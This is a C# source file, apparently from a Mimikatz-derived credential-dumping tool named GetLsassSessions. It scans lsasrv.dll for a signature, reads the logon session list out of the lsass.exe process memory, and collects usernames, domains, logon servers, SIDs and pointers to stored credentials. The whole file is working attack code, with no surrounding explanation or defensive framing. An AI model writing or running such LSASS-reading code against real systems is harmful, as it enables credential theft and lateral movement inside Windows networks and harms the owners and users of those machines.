using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static GetLsassSessions.Template;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

namespace GetLsassSessions
{
    internal class LogonSessions
    {
        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool ConvertSidToStringSid([MarshalAs(UnmanagedType.LPArray)] byte[] pSID, out IntPtr ptrSid);

        private static long max_search_size = 580000;

        private static string[] KUHL_M_SEKURLSA_LOGON_TYPE = {
            "UndefinedLogonType",
            "Unknown !",
            "Interactive",
            "Network",
            "Batch",
            "Service",
            "Proxy",
            "Unlock",
            "NetworkCleartext",
            "NewCredentials",
            "RemoteInteractive",
            "CachedInteractive",
            "CachedRemoteInteractive",
            "CachedUnlock"
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
        {
            public IntPtr LogonId;
            public string UserName;
            public string LogonDomain;
            public int LogonType;
            public int Session;
            public IntPtr pCredentials;
            public IntPtr pSid;
            public IntPtr pCredentialManager;
            public FILETIME LogonTime;
            public string LogonServer;
        }

        public static int FindSessions(IntPtr hLsass, IntPtr lsasrvMem, LsassTemplate template, List<Logon> logonlist)
        {
            uint logonSessionListSignOffset;
            int logonSessionListCount;
            List<long> offsetlist = new List<long>();

            logonSessionListSignOffset = (uint)Utility.OffsetFromSign("lsasrv.dll", template.signature, max_search_size);
            if (logonSessionListSignOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find LogonSessionList signature\n");
                return 1;
            }

            logonSessionListCount = Utility.GetInt(hLsass, lsasrvMem, logonSessionListSignOffset, template.LogonSessionListCountOffset);
            IntPtr ptr_entry_loc = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, template.first_entry_offset);

            for (int i = 0; i < logonSessionListCount; i++)
            {
                IntPtr pos;
                IntPtr listentry;
                IntPtr entry_ptr;
                entry_ptr = (ptr_entry_loc + (0 * i));
                pos = entry_ptr;
                int count = 0;
                do
                {
                    byte[] listentryBytes = Utility.ReadFromLsass(ref hLsass, pos, template.ListTypeSize);
                    GCHandle pinnedArray = GCHandle.Alloc(listentryBytes, GCHandleType.Pinned);
                    listentry = pinnedArray.AddrOfPinnedObject();

                    count++;
                    if (count >= 255)
                        break;

                    if (entry_ptr == listentry)
                        break;

                    if (pos == IntPtr.Zero)
                        break;

                    if (offsetlist.Contains((pos.ToInt64())))
                    {
                        break;
                    }
                    offsetlist.Add(pos.ToInt64());

                    KIWI_BASIC_SECURITY_LOGON_SESSION_DATA logonsession = new KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
                    {
                        LogonId = IntPtr.Add(listentry, template.LocallyUniqueIdentifierOffset),
                        LogonType = Marshal.ReadInt32(IntPtr.Add(listentry, template.LogonTypeOffset)),
                        Session = Marshal.ReadInt32(IntPtr.Add(listentry, template.SessionOffset)),
                        pSid = IntPtr.Add(listentry, template.pSidOffset),
                        LogonTime = Utility.ReadStruct<FILETIME>(IntPtr.Add(listentry, template.LogonTimeOffset + 4))
                    };

                    LUID luid = Utility.ReadStruct<LUID>(logonsession.LogonId);

                    IntPtr pUserName = IntPtr.Add(pos, template.UserNameListOffset);
                    IntPtr pLogonDomain = IntPtr.Add(pos, template.DomainOffset);
                    IntPtr pLogonServer = IntPtr.Add(pos, template.LogonServerOffset);

                    logonsession.UserName = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUserName));
                    logonsession.LogonDomain = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonDomain));
                    logonsession.LogonServer = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonServer));

                    string stringSid = "";
                    try
                    {
                        ConvertSidToStringSid(Utility.ExtractSid(hLsass, logonsession.pSid), out IntPtr pstringSid);
                        stringSid = Marshal.PtrToStringAuto(pstringSid);
                    }
                    catch
                    {
                    }

                    Logon logon = new Logon(luid)
                    {
                        Session = logonsession.Session,
                        LogonType = KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType],
                        LogonTime = logonsession.LogonTime,
                        UserName = logonsession.UserName,
                        LogonDomain = logonsession.LogonDomain,
                        LogonServer = logonsession.LogonServer,
                        SID = stringSid,
                    };
                    logonlist.Add(logon);
                    pos = new IntPtr(Marshal.ReadInt64(listentry));
                    pinnedArray.Free();
                } while (true);
            }
            return 0;
        }
    }
}